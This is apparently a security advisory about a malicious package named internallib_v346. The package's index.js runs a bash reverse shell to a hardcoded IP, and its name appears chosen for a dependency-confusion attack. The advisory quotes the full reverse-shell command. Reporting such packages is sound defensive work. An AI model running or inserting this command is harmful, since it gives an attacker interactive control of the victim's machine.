summary: Reverse shell backdoor to hardcoded IP in internallib_v346
details: The package's main entry (index.js) exports a `command()` function that invokes `exec('/bin/bash -c "bash -i >& /dev/tcp/10.0.56.229/80 0>&1"')`, opening an interactive bash reverse shell from the installer's host to 10.0.56.229:80. A sibling check.js demonstrates calling the export, so any consumer that requires this module and triggers the export will hand interactive remote control of their machine to whoever controls that IP. The package.json has empty author and description fields and the name `internallib_v346` mimics the shape of an internal/private package — the canonical pattern of a dependency-confusion attack against an organization that uses an internal package by this name. There is no legitimate library functionality in the tarball; the reverse shell is the package's sole behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
